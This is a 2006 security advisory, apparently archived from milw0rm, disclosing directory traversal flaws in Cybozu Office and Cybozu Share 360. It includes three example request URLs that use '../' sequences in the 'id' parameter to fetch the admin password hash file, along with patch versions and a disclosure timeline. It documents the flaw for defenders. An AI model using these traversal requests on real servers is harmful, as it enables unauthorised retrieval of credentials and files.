@@ -1,0 +1,70 @@
+Cybozu Products Arbitrary File Retrieval Vulnerability
+
+by Tan Chew Keong
+Release Date: 2006-08-28
+
+Summary
+
+A vulnerability has been found in Cybozu Products. When exploited, the vulnerability allows 
+an authenticated user to retrieve arbitrary files accessible to the web server process.
+
+Tested Versions
+    * Cybuzu Office Version 6.5 (Build 1.2 20050427121735) for Windows
+    * Cybozu Share 360 Version 2.5 (Build 0.2 20050121115231) for Windows
+
+
+Details
+
+This advisory discloses a directory traversal vulnerability in Cybozu products.
+1) Cybozu Office File Cabinet File Download Directory Traversal
+
+Cybuzu Office does not properly validate the "id" parameter in "/scripts/cbag/ag.exe" before 
+using it to retrieve files from the file cabinet for a logon user. This allows a malicious user 
+to retrieve arbitrary files accessible to the web server process using directory traversal characters.
+
+Example (to retrieve the password hash of the admin page):
+
+http://192.168.1.64/scripts/cbag/ag.exe?page=FileDownload&id=../../../../../../../../../../../../../inetpub/scripts/cbag/cb5/data/admin&notimecard=1&type=text&subtype=html&ct=1
+ 
+
+2) Cybozu Share 360 File Cabinet and Message Attachment Download Directory Traversal
+
+Cybuzu Share 360 does not properly validate the "id" parameter in "/scripts/s360v2/s360.exe" 
+before using it to retrieve files from the file cabinet and to retrieve file attachments from a 
+received message/memo. This allows a malicious user to retrieve arbitrary files accessible to the 
+web server process using directory traversal characters.
+
+Example (to retrieve the password hash of the admin page):
+
+http://192.168.1.64/scripts/s360v2/s360.exe?page=FileDownload&id=../../../../../../../../../../inetpub/scripts/s360v2/s360v2/data/admin&type=text&subtype=plain&ct=1&.txt
+
+http://192.168.1.64/scripts/s360v2/s360.exe?page=MessageDownload&mid=37&id=../../../../../../../../../../inetpub/scripts/s360v2/s360v2/data/admin&bc=1&type=text&subtype=plain&ct=1&.txt
+ 
+
+Patch / Workaround
+
+Cybuzu Office:
+Update to Version 6.6 (Build 1.3).
+
+Cybozu Share 360:
+Update to Version 2.5 (Build 0.3).
+
+References
+
+http://cybozu.co.jp/products/dl/notice_060825/
+
+Disclosure Timeline
+
+2006-07-04 - Vulnerability Discovered.
+2006-07-13 - Initial Vendor Notification.
+2006-07-13 - Initial Vendor Reply.
+2006-07-14 - Received scheduled patch release date from vendor.
+2006-08-16 - Received notification that patch release will be delayed.
+2006-08-25 - Vendor released patch information on website.
+2006-08-28 - Public Disclosure.
+
+Contact
+For further enquries, comments, suggestions or bug reports, simply email them to 
+Tan Chew Keong (chewkeong[at]vuln[dot]sg)
+
+# milw0rm.com [2006-08-28]
